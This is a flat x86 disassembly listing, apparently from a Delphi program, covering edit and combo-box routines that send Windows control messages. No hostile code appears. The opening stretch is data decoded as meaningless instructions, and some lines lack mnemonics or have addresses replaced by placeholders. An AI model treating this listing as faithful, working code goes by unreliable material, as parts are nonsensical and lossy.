cmp [ eax + eax - 0x68 ] al
outsb
inc ebx
add ah ah
inc esp
add [ edx + eax * 2 + 0x44 ] bh
add [ esi + esi * 2 + 0x44 ] dh
add [ eax ] ch
popad
inc esp
add [ eax + 0x64 ] dl
inc esp
add [ eax - 0x3bffbc98 ] cl
push 0x43
add [ eax + 0x2c00436a ] al
insb
inc ebx
add ah dh
push 0x43
add [ edx + ebp * 2 + 0x6b580043 ] ah
inc ebx
add [ eax + 0x800436b ] dl
add [ eax ] dh
add [ eax ] dl
mov al 0x1a
mov al 0xe
mov al 0x11
mov ebp 0x7bb012
mov bl 0xff
hlt
sub_4354e4
loopne r-xdata
sub cl bl
inc ecx
add [ esp + ebp * 8 ] dl
inc ebx
add [ ecx + ebx * 8 + 0x41 ] bl
add al al
in al dx
inc ebx
add [ eax + ebx * 8 - 0x26bfffbf ] ch
inc ecx
add [ ecx + ebx * 8 - 0x14ffffbf ] dl
inc ebx
add [ eax + edx * 4 - 0x148bffbd ] dh
inc ebx
add [ edx + eax * 8 + 0x44 ] bh
add [ ecx - 0x1313ffbc ] dh
inc ebx
add [ eax - 0x33ffbc15 ] ch
retn 0x44
inc esp
add al ah
jmp r-xdata
dec esp
imul ebp [ esi + 0x6b ] 0x5580c08b
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4356 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x56 ] dl
inc ebx
add [ edx + 0x56 ] ch
inc ebx
add [ edx + eax ] cl
add [ eax ] al
sub al 0xbf
inc ebx
add [ eax ] cl
fadd [ ecx ]
cmp al 0x35
inc eax
add [ ecx + edx * 8 + 0x41 ] bl
add [ ebp + esi + 0x40 ] al
add [ eax ] dl
inc eax
inc esp
add [ eax - 0x63ffbfce ] al
xor al [ eax ]
call 0xffffffffa44399a3
outsd
inc esp
add al bl
aaa
inc esp
add [ ebx + edi * 2 ] dl
inc ecx
add [ ebp + ebx + 0x44 ] ch
add [ eax - 0x73ffbc0f ] al
and al 0x44
add [ eax + 0x200043fa ] bl
fadd [ ecx ]
or ch dl
inc ecx
add [ eax ] al
aad 0x41
add [ eax ] ch
fadd [ ecx ]
push eax
xchg ecx eax
inc ebx
add [ eax - 0x2bffbb96 ] bh
outsd
inc esp
add [ eax ] ah
outsd
inc esp
add ah dh
out dx eax
inc ebx
add [ eax + 0x65 ] bh
inc esp
add [ eax + 0x78004465 ] bl
bound eax [ eax + eax + 0x3c ]
out dx eax
inc ebx
add [ eax - 0x11 ] al
inc ebx
add [ edi + ebx ] bh
inc esp
add [ eax + 0x1f ] ch
inc esp
add [ eax - 0x47ffbc06 ] al
sub_435756
inc ebx
add [ esp + edi * 8 ] cl
inc ebx
add [ ebx + edi * 8 - 0x167ffbd ] al
inc ebx
add [ ebp + edi * 8 + 0x43 ] al
add [ edx + edx * 4 ] bl
inc ebx
add ah ch
pop ds
inc esp
add [ ebx ] al
inc esp
add al al
arpl [ eax + eax - 0x7c ] ax
pop esi
inc esp
add [ ebx + 0x25040044 ] ah
inc esp
add [ eax + 0x3800442b ] bl
cmp [ eax + eax + 0x58 ] eax
xchg esp eax
inc ebx
add [ eax ] ah
inc esp
add [ esp + edx * 4 + 0x39d00043 ] dl
inc esp
add ah dl
cmp [ eax + eax - 0x74 ] eax
cmp [ eax + eax + 0x34 ] al
cmp [ eax + eax - 0x1c ] al
inc esp
add [ edx + eax * 2 + 0x44 ] bh
add [ esi + esi * 2 + 0x44 ] dh
add [ eax ] ch
popad
inc esp
add [ eax + 0x64 ] dl
inc esp
add ah dh
xchg ecx eax
inc ebx
add [ eax ] bl
xchg edx eax
inc ebx
add al dl
xchg ebx eax
inc ebx
add [ eax ] cl
add [ 0x7b006b0 ] al
mov al 0x11
mov ebp 0x14bd35
jmp r-xdata
dec eax
inc eax
xchg esp eax
inc ebx
add [ eax ] dh
xchg ebp eax
inc ebx
add [ ebp + edx * 4 - 0x6b53ffbd ] dh
inc ebx
add [ esi + edx * 4 ] dh
inc ebx
add [ eax ] cl
xchg esi eax
inc ebx
add [ eax - 0x33ffbc6d ] ch
xchg ebx eax
inc ebx
add [ edi ] al
push esp
inc edx
jne r-xdata
add dh bh
aam 0xfd
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
je r-xdata
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
imul ebp [ edi + 0x6e ] r-xdata
je r-xdata
push [ eax ]
outsb
mov eax eax
or [ eax + 0x43 ] bl
add [ edi ] al
pop es
push esp
inc edx
jne r-xdata
add bh bh
test [ ecx ] ah
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0010 ] al
outsd
outsb
jae r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
adc [ edx ] eax
add bh bh
adc [ edx ] eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
push cs
add [ esi ] al
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi - 0x34fffbd ] ch
inc ebx
add al ah
cld
inc ebx
add [ esp + ebx + 0x44 ] ch
add [ eax - 0x80000000 ] al
sldt [ edi ]
inc ebx
popad
jo r-xdata
add [ eax ] cl
inc edx
je r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
jb r-xdata
add [ eax + 0x4208000d ] al
outsb
hlt
add [ eax ] al
adc eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax ] dl
add al [ eax ]
jmp [ esp + edx * 4 ]
sub_43687e
add [ eax ] al
test al 0x2
add [ eax ] al
mov eax 0x53000002
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0xc5
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_436908
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x208 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x208 ] esi
mov eax ebx
call sub_4467d4
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc8 ]
sub_43694c
push ebx
push esi
mov esi eax
mov bl [ esi + 0x215 ]
mov eax esi
call sub_4467d4
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb8
mov eax esi
call sub_4464d0
push eax
call SendMessageA
test eax eax
setne bl
sub_436984
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4467d4
test al al
je r-xdata
mov [ esi + 0x215 ] bl
pop esi
pop ebx
retn
push 0x0
xor eax eax
mov al bl
push eax
push 0xb9
mov eax esi
call sub_4464d0
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_4369bc
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_436a39
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x20d ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436a40
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov [ ebx + 0x20d ] dl
mov eax ebx
call sub_4467d4
test al al
je r-xdata
push 0x0
xor eax eax
mov al [ ebx + 0x20d ]
push eax
push 0xcc
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43fcb0
mov eax [ ebp - 0x4 ]
call sub_4044f8
mov edx eax
mov eax ebx
call sub_43fc8c
sub_436a44
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x20e ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x20e ] bl
mov eax esi
call sub_4467d4
test al al
je r-xdata
push 0x0
xor eax eax
mov al bl
push eax
push 0xcf
mov eax esi
call sub_4464d0
push eax
call SendMessageA
sub_436a80
push ebx
push ecx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
mov eax [ esp ]
pop edx
pop ebx
retn
sub_436aa4
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push esi
push 0xb1
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_436ac4
push ebx
add esp 0xfffffff8
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
mov eax [ esp + 0x4 ]
sub eax [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_436af4
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
add esi [ esp ]
mov [ esp + 0x4 ] esi
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0xb1
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
push 0x0
push 0x0
push 0xb7
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
pop ecx
pop edx
pop esi
pop ebx
retn
sub_436b90
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_43fc24
inc eax
call sub_408a3c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_436c1a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_408a50
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_43fc34
cmp edi [ ebp - 0x8 ]
jg r-xdata
mov edx [ ebp - 0xc ]
add edx esi
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4088b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436c21
mov eax [ ebp - 0xc ]
call sub_408a88
retn
dec edi
mov [ ebp - 0x8 ] edi
sub_436c2c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov [ ebp - 0x8 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov esi eax
mov eax edi
mov ecx esi
xor edx edx
call sub_404128
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
call sub_43fc24
inc eax
call sub_408a3c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_436cba
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_408a50
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_43fc34
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
add eax edx
mov edx [ edi ]
mov ecx esi
call sub_402968
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_408a88
retn
sub_436cc8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_443324
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_443250
mov eax [ esi + 0x4 ]
or eax 0xc0
xor edx edx
mov dl [ ebx + 0x20c ]
or eax [ edx * 4 + rw-data ]
cmp [ ebx + 0x20d ] 0x0
setne dl
and edx 0x7f
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x20e ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x213 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x211 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x212 ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_436d81
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffff74
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax ebx
call sub_443620
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
test [ edx + 0x5 ] 0x8
je r-xdata
mov esi edx
mov edi esp
mov ecx 0x23
[ edi ] [ esi ]
and [ esp + 0x4 ] 0xfffff7ff
mov edx esp
mov eax ebx
call sub_443620
mov eax [ ebx + 0x180 ]
test eax eax
je r-xdata
add esp 0x8c
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x1
push 0xcf
push eax
call SendMessageA
jmp r-xdata
sub_436df4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x1
xor eax eax
push ebp
push sub_436e33
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_443450
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436e3a
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x0
retn
sub_436e3a
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x208 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc8 ]
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x215 ]
mov eax [ ebp - 0x4 ]
call sub_436984
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20d ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_436eb4
pop ecx
pop ebp
retn
push 0x0
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20d ]
push eax
push 0xcc
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
call SendMessageA
sub_436eb4
push ebx
mov ebx eax
cmp [ ebx + 0x20f ] 0x0
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
pop ebx
retn
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_436ef0
pop ebx
retn
sub_436ef0
push ebx
push esi
push edi
add esp 0xffffff90
mov esi eax
push 0x0
call GetDC
mov ebx eax
push esp
push ebx
call GetTextMetricsA
mov eax [ esi + 0x68 ]
call sub_420480
push eax
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x38 ]
push eax
push ebx
call GetTextMetricsA
push edi
push ebx
call SelectObject
push ebx
push 0x0
call ReleaseDC
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov ebx [ esp ]
mov eax [ esp + 0x38 ]
cmp ebx eax
jle r-xdata
cmp [ esi + 0x1a5 ] 0x0
je r-xdata
push 0x6
call GetSystemMetrics
shl eax 0x2
test ebx ebx
jns r-xdata
mov ebx eax
mov ebx 0x6
mov ebx 0x8
jmp r-xdata
sar ebx 0x2
add eax ebx
mov ebx eax
add ebx 0x3
mov edx [ esp + 0x38 ]
add edx ebx
mov eax esi
call sub_43f490
add esp 0x70
pop edi
pop esi
pop ebx
retn
push 0x6
call GetSystemMetrics
imul ebx
mov ebx eax
jmp r-xdata
sub_436fbc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0x7
jne r-xdata
mov edx ebx
mov eax esi
call sub_444010
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
jne r-xdata
xor eax eax
mov [ ebx + 0x4 ] eax
sub_436ff4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
retn
push 0xfffffff0
mov eax esi
call sub_4464d0
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
push 0x0
push 0x3
push 0xd3
mov eax esi
call sub_4464d0
push eax
call SendMessageA
sub_437034
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_445ab0
pop esi
pop ebx
retn
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
mov eax ebx
call sub_436eb4
mov eax ebx
call sub_443a38
sub_437068
push ebx
mov ebx eax
mov eax ebx
call sub_4459f4
test [ ebx + 0x51 ] 0x2
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_436ef0
test [ ebx + 0x1c ] 0x1
jne r-xdata
sub_4370b0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44584c
pop esi
pop ebx
retn
test [ ebx + 0x54 ] 0x1
jne r-xdata
push 0xfffffff0
mov eax ebx
call sub_4464d0
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
mov eax ebx
call sub_436b74
sub_4370ec
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_4467d4
test al al
je r-xdata
mov eax esi
mov si 0xffb3
call sub_4034e4
push 0xfffffff0
mov eax esi
call sub_4464d0
push eax
call GetWindowLongA
test al 0x4
je r-xdata
pop esi
retn
sub_437124
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov edx esi
mov eax ebx
call sub_44756c
pop esi
pop ebx
retn
sub_43715c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4371c2
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push edi
push 0x150
mov eax [ ebx + 0x10 ]
call sub_4464d0
push eax
call SendMessageA
mov esi eax
cmp esi 0xffffffff
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4371c9
lea eax [ ebp - 0x4 ]
call sub_404038
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405dec
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_41813c
sub_4371d4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x151
mov eax [ ebx + 0x10 ]
call sub_4464d0
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_4371f8
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
push 0x0
push edi
push 0x149
mov eax [ ebx + 0x10 ]
call sub_4464d0
push eax
call SendMessageA
cmp eax 0xffffffff
je r-xdata
mov eax esi
xor edx edx
call sub_404684
mov edx esi
xchg edx eax
call sub_404684
mov eax [ esi ]
call sub_4044f8
push eax
push edi
push 0x148
mov eax [ ebx + 0x10 ]
call sub_4464d0
push eax
call SendMessageA
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_437250
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4372b4
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_43fcb0
push 0x0
push 0x0
push 0x14b
mov eax [ ebx + 0x10 ]
call sub_4464d0
push eax
call SendMessageA
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_43fce0
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x88 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4372bb
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_4372c0
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x144
mov eax [ ebx + 0x10 ]
call sub_4464d0
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_4372e0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4044f8
push eax
push 0xffffffff
push 0x158
mov eax [ ebx + 0x10 ]
call sub_4464d0
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_437308
push ebx
push esi
mov ebx edx
mov esi eax
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x10 ]
call sub_4464d0
push eax
call SendMessageA
xor bl 0x1
test bl bl
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x10 ]
call sub_4401ec
sub_43733c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4373af
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4044f8
push eax
push 0x0
push 0x143
mov eax [ ebx + 0x10 ]
call sub_4464d0
push eax
call SendMessageA
mov ebx eax
test ebx ebx
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4373b6
lea eax [ ebp - 0x4 ]
call sub_404038
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7d8
call sub_403a74
sub_4373c0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_437433
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_4044f8
push eax
push esi
push 0x14a
mov eax [ ebx + 0x10 ]
call sub_4464d0
push eax
call SendMessageA
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43743a
lea eax [ ebp - 0x4 ]
call sub_404038
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7d8
call sub_403a74
sub_437440
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4421c4
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x91
mov eax ebx
call sub_43f46c
mov edx 0x19
mov eax ebx
call sub_43f490
mov dl 0x1
mov eax ebx
call sub_446704
xor edx edx
mov eax ebx
call sub_43fe74
mov dl 0x1
mov eax [ r-xdata ]
call sub_420d88
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_43e88c
mov [ ebx + 0x238 ] 0x10
push ebx
push sub_4377e4
call sub_41e128
mov [ ebx + 0x24c ] eax
push ebx
push sub_4378dc
call sub_41e128
mov [ ebx + 0x254 ] eax
mov [ ebx + 0x210 ] 0x8
mov [ ebx + 0x214 ] 0xffffffff
mov [ ebx + 0x260 ] 0xffffffff
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_437534
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax esi
call sub_4467d4
test al al
je r-xdata
mov eax [ esi + 0x254 ]
call sub_456ab0
mov eax [ esi + 0x24c ]
call sub_456ab0
mov eax [ esi + 0x208 ]
call sub_4032e8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4422e8
test bl bl
jle r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xac ]
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_4375b6
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
call sub_44388c
xor eax eax
mov [ ebx + 0x240 ] eax
xor eax eax
mov [ ebx + 0x244 ] eax
xor eax eax
mov [ ebx + 0x248 ] eax
pop ebx
retn
sub_437600
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x157
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_437624
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
push 0x0
xor eax eax
mov al bl
push eax
push 0x14f
mov eax esi
call sub_4464d0
push eax
call SendMessageA
mov edx esp
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax esi
call sub_4464d0
push eax
call InvalidateRect
add esp 0x10
pop esi
pop ebx
retn
sub_43766c
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x1
je r-xdata
push 0x0
push 0x0
push 0x147
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
pop ebx
retn
mov eax [ ebx + 0x214 ]
pop ebx
retn
sub_437698
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
cmp esi eax
je r-xdata
mov [ ebx + 0x214 ] esi
pop esi
pop ebx
retn
pop esi
pop ebx
retn
push 0x0
push esi
push 0x14e
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
sub_4376d4
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jge r-xdata
cmp esi [ ebx + 0x20c ]
je r-xdata
xor esi esi
pop esi
pop ebx
retn
mov [ ebx + 0x20c ] esi
mov eax ebx
call sub_4467d4
test al al
je r-xdata
push 0x0
push esi
push 0x141
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
sub_437724
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x64 ] 0x0
je r-xdata
pop esi
retn
mov eax [ esi + 0x64 ]
push eax
mov eax esi
call sub_4464d0
push eax
call SetWindowTextA
sub_437760
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_437600
test al al
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0xc ] 0x4
sub_437798
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_445ab0
pop esi
pop ebx
retn
mov eax ebx
call sub_443a38
sub_4377bc
push ebx
mov ebx eax
mov eax ebx
call sub_441888
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x276 ] 0x2
jae r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4377e4
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ esi ] 0x112
jne r-xdata
mov eax [ esi ]
cmp eax 0x100
jb r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
jmp r-xdata
mov eax [ ebx + 0x250 ]
push eax
mov edx esi
mov ecx [ ebx + 0x240 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xf4 ]
mov eax [ esi ]
sub eax 0x30
je r-xdata
cmp eax 0x108
ja r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
sub eax 0x1d1
je r-xdata
mov eax ebx
call sub_456c04
mov edi eax
test edi edi
je r-xdata
push 0x0
push 0x3
push 0xd3
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
sub eax 0x2
jne r-xdata
mov ecx esi
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax ebx
call sub_43f7f4
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406d00
push eax
push 0x0
push 0x202
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
or ecx 0xffffffff
xor edx edx
mov eax ebx
call sub_440358
jmp r-xdata
sub_437910
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_437bc7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x104
jg r-xdata
cmp eax 0xbd00
jg r-xdata
je r-xdata
sub eax 0xbd02
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp esi [ eax + 0x244 ]
je r-xdata
cmp eax 0x87
jg r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub eax 0x2
je r-xdata
sub eax 0x105
je r-xdata
mov eax [ ebx + 0x8 ]
push eax
